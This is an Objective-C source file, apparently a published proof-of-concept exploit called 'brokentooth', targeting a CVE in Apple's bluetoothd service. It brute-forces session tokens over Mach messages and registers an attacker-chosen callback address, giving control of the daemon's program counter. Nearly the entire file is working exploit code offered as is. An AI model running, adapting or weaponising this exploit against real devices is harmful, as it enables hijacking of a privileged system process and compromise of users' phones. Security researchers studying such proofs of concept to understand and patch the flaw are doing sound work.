//
//  brokentooth.m
//  brokentooth
//
//  Created by @omerporze on 02/09/2018.
//  Copyright © 2018 omerporze. All rights reserved.
//
//  Credits to @raniXCH for his POC code and @SparkZheng for finding the CVE and publishing the lecture.
//

#include "brokentooth.h"

extern kern_return_t bootstrap_look_up(mach_port_t bs, const char *service_name, mach_port_t *service);



#define BT_CONST 0xFA300    // the functions start form this offset on
#define BT_WRONG_TOKEN 7

#define BT_MACH_MESSAGE_ACCESSORY_MANAGER_ADD_CALLBACK_MSG_ID 0x65  // the ordinal for our function
#define BT_MACH_MESSAGE_ACCESSORY_MANAGER_ADD_CALLBACK_RECV_SIZE 0x34
#define BT_MACH_MESSAGE_ACCESSORY_MANAGER_ADD_CALLBACK_SEND_SIZE 0x38
#define BT_MACH_MESSAGE_ACCESSORY_MANAGER_ADD_CALLBACK_OPTIONS 0x113
#define BT_MACH_MESSAGE_ACCESSORY_MANAGER_ADD_CALLBACK_TIMEOUT 0x186A0
#define BT_MIG_SERVER_NAME "com.apple.server.bluetooth"

#define ADD_CALLBACK_MACH_MSG_OUT_RETURN_VALUE_OFFSET 0x20
#define ADD_CALLBACK_MACH_MSG_IN_SESSION_TOKEN_OFFSET 0x20
#define ADD_CALLBACK_MACH_MSG_IN_CALLBACK_ADDRESS_OFFSET 0x28


#define CALLBACK_ADDRESS 0xdeadbeef // address PC will be set to

typedef unsigned int mach_msg_return_value;


mach_port_t get_service_port(char *service_name)
{
    
    kern_return_t ret = KERN_SUCCESS;
    mach_port_t service_port = MACH_PORT_NULL;
    mach_port_t bs = MACH_PORT_NULL;
    
    
    ret = task_get_bootstrap_port(mach_task_self(), &bs);
    
    ret = bootstrap_look_up(bootstrap_port, service_name, &service_port);
    if (ret)
    {
        NSLog(@"Couldn't find port for %s",service_name);
        return MACH_PORT_NULL;
    }
    
    NSLog(@"Got port: %x", service_port);
    
    mach_port_deallocate(mach_task_self(), bs);
    return service_port;
}


mach_msg_return_value BTAccessory_manager_add_callbacks(mach_port_t bluetoothd_port, mach_port_t session_token, void* callback_address, long additional_data)
{
    mach_port_t receive_port = MACH_PORT_NULL;
    mach_msg_header_t * message = NULL;
    char *data = NULL;
    kern_return_t ret = KERN_SUCCESS;
    
    mach_msg_return_value return_value = 0;
    
    
    
    mach_msg_id_t msgh_id = BT_MACH_MESSAGE_ACCESSORY_MANAGER_ADD_CALLBACK_MSG_ID;
    mach_msg_size_t recv_size = BT_MACH_MESSAGE_ACCESSORY_MANAGER_ADD_CALLBACK_RECV_SIZE;
    mach_msg_size_t send_size = BT_MACH_MESSAGE_ACCESSORY_MANAGER_ADD_CALLBACK_SEND_SIZE;
    mach_msg_option_t options = BT_MACH_MESSAGE_ACCESSORY_MANAGER_ADD_CALLBACK_OPTIONS;
    mach_msg_size_t msg_size = MAX(recv_size, send_size);
    
    
    ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &receive_port);
    if ( ret != KERN_SUCCESS)
    {
        return_value = -3;
        NSLog(@"Failed to allocate port ret=%x", ret);
        NSLog(@"mach_error_string: mach_error_string %s", mach_error_string(ret));
        goto cleanup;
    }
    ret = mach_port_insert_right(mach_task_self(), receive_port, receive_port, MACH_MSG_TYPE_MAKE_SEND);
    if ( ret != KERN_SUCCESS)
    {
        return_value = -3;
        NSLog(@"Failed to insert port right ret=%x", ret);
        NSLog(@"mach_error_string: mach_error_string %s", mach_error_string(ret));
        goto cleanup;
    }
    message = malloc(msg_size);
    data = (char *)message;
    
    memset(message, 0, msg_size);
    
    *((mach_port_t *)(data+ADD_CALLBACK_MACH_MSG_IN_SESSION_TOKEN_OFFSET)) = session_token;
    *((void **)(data+ADD_CALLBACK_MACH_MSG_IN_CALLBACK_ADDRESS_OFFSET)) = callback_address;
    
    message->msgh_bits = 0x1513 ;
    
    message->msgh_remote_port = bluetoothd_port; /* Request port */
    message->msgh_local_port = receive_port; /* Reply port */
    message->msgh_size =  send_size;    /* Message size */
    message->msgh_reserved = 0;
    
    
    message->msgh_id = BT_CONST + msgh_id;
    
    ret = mach_msg(message,              /* The header */
                   options, /* Flags */
                   send_size,              /* Send size */
                   recv_size,              /* Max receive Size */
                   receive_port,                 /* Receive port */
                   BT_MACH_MESSAGE_ACCESSORY_MANAGER_ADD_CALLBACK_TIMEOUT,        /* No timeout */
                   MACH_PORT_NULL);              /* No notification */
    
    
    if(MACH_MSG_SUCCESS == ret)
    {
        return_value = *(mach_msg_return_value *) (((char *) message) + ADD_CALLBACK_MACH_MSG_OUT_RETURN_VALUE_OFFSET);
        if (return_value != BT_WRONG_TOKEN) {
            NSLog(@"Sent message id %d with token %x, returned: %x", msgh_id, session_token, return_value);
        }
    } else if (MACH_RCV_INVALID_NAME == ret)
    {
        NSLog(@"mach_error_string: mach_error_string %s", mach_error_string(ret));
        NSLog(@"mach_error_int: ret=%x", ret);
        NSLog(@"mach_remote_port: %x", message->msgh_remote_port);
        return_value = -2;
    }
    else {
        NSLog(@"mach_error_string: mach_error_string %s", mach_error_string(ret));
        NSLog(@"mach_error_int: ret=%x", ret);
        NSLog(@"mach_remote_port: %x", message->msgh_remote_port);
        return_value = -1;
    }
    
    
cleanup:
    if(MACH_PORT_NULL != receive_port)
    {
        mach_port_destroy(mach_task_self(), receive_port);
    }
    if (NULL != message) {
        free(message);
    }
    return return_value;
}


void try_to_add_callback(void * address, long value)
{
    int ports_found[0xffff] = {0};
    int number_of_ports_found = 0;
    
    mach_port_t bluetoothd_port = get_service_port(BT_MIG_SERVER_NAME);
    if (MACH_PORT_NULL == bluetoothd_port)
    {
        NSLog(@"Couldn't have bluetoothd port");
        return;
    }
    
    NSLog(@"Starting to look for session tokens");
    for (int i = 0; i <= 0xffff; i++) {
        int id = 0;
        id = (i << 16) + 1;
        int result_code = BTAccessory_manager_add_callbacks(bluetoothd_port, id, address, value);
        if(result_code != BT_WRONG_TOKEN && result_code != -1)
        {
            NSLog(@"Found port: %x", id);
            ports_found[number_of_ports_found] = id;
            number_of_ports_found ++;
        }
        
        
        id = (i << 16) + 2;
        result_code = BTAccessory_manager_add_callbacks(bluetoothd_port, id, address, value);
        if(result_code != BT_WRONG_TOKEN && result_code != -1)
        {
            NSLog(@"Found port: %x", id);
            ports_found[number_of_ports_found] = id;
            number_of_ports_found ++;
        }
        
        
        id = (i << 16);
        result_code = BTAccessory_manager_add_callbacks(bluetoothd_port, id, address, value);
        if(result_code != BT_WRONG_TOKEN && result_code != -1)
        {
            NSLog(@"Found port: %x", id);
            ports_found[number_of_ports_found] = id;
            number_of_ports_found ++;
        }
        
    }
    
    for (int i = number_of_ports_found-1; i>=0; i--) {
        NSLog(@"Adding callback: Port=%x address=%x value=%x", ports_found[i], (unsigned int)address, (unsigned int)value);
        BTAccessory_manager_add_callbacks(bluetoothd_port, ports_found[i],address, value);
    }
    
    NSLog(@"Done");
    return;
}

void trigger() {
    try_to_add_callback((void *)CALLBACK_ADDRESS, 0);
}


int start() {
    trigger();
    return 0;
}

